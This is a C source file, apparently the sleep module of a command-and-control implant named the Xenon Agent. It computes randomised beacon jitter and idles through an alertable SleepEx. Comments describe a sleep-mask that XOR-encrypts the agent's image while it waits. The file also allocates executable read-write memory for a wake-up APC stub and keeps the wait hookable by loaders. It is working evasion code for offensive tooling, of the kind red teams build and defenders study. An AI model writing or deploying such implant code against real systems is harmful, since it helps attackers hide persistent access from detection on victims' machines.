#include "Sleep.h"
#include "Debug.h"
#include "Utils.h"
#include "Config.h"

static HANDLE   g_SleepThread = NULL;
static PAPCFUNC g_SleepApc    = NULL;

static VOID CALLBACK SleepApc(ULONG_PTR param)
{
    (void)param;
}

VOID SleepInit(void)
{
    if (!g_SleepApc) {
        /*
         * Sleep-mask XOR's the mapped image during SleepEx. The APC must
         * live in untracked VirtualAlloc so it is safe if it runs while
         * the DLL is still encrypted (inside the hooked wait).
         */
        g_SleepApc = (PAPCFUNC)VirtualAlloc(NULL, 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (g_SleepApc)
            *(BYTE *)g_SleepApc = 0xC3; /* ret */
        else
            g_SleepApc = SleepApc;
    }

    if (g_SleepThread)
        return;

    DuplicateHandle(
        GetCurrentProcess(),
        GetCurrentThread(),
        GetCurrentProcess(),
        &g_SleepThread,
        THREAD_SET_CONTEXT,
        FALSE,
        0);
}

VOID SleepWake(void)
{
    if (g_SleepThread && g_SleepApc)
        QueueUserAPC(g_SleepApc, g_SleepThread, 0);
}

HANDLE SleepThreadHandle(void)
{
    return g_SleepThread;
}

PAPCFUNC SleepWakeApc(void)
{
    return g_SleepApc;
}

/**
 * @brief HTTPX/WebSocket C2 idle wait.
 * Always goes through KERNEL32$SleepEx so Crystal Palace loaders can addhook it.
 * Alertable so BeaconWakeup can interrupt via APC.
 */
DWORD SleepIdle(DWORD dwMilliseconds)
{
    return SleepEx(dwMilliseconds, TRUE);
}

#if defined(HTTPX_TRANSPORT) || defined(WEBSOCKET_TRANSPORT)

/**
 * @brief Core Sleep Routine for the Xenon Agent.
 * Computes jitter then idles via SleepIdle (KERNEL32$SleepEx).
 */
VOID SleepWithJitter(INT baseSleepTime, INT maxJitter) 
{
    if (baseSleepTime == 0)
        return;
    
    if (maxJitter == 0)
        goto SLEEP;

    const INT minJitter = 1;
    const INT jitterRange = maxJitter / 2;

    /* Generate jitter within the defined range */
    int Rand = RandomInt32(-jitterRange, jitterRange);

    /* Apply jitter to the base sleep time */
    baseSleepTime += Rand;

    /* Sleep cannot be negative */
    if (baseSleepTime < minJitter)
        baseSleepTime = minJitter;

SLEEP:

    _dbg("AGENT GOING TO SLEEP : %d seconds", baseSleepTime);
    SleepIdle((DWORD)baseSleepTime * 1000);
}

#else // SMB_TRANSPORT & TCP_TRANSPORT

VOID SleepWithJitter(INT baseSleepTime, INT maxJitter)
{
    if (baseSleepTime == 0)
    {
        return;
    }
    
    Sleep(500);
    
}

#endif
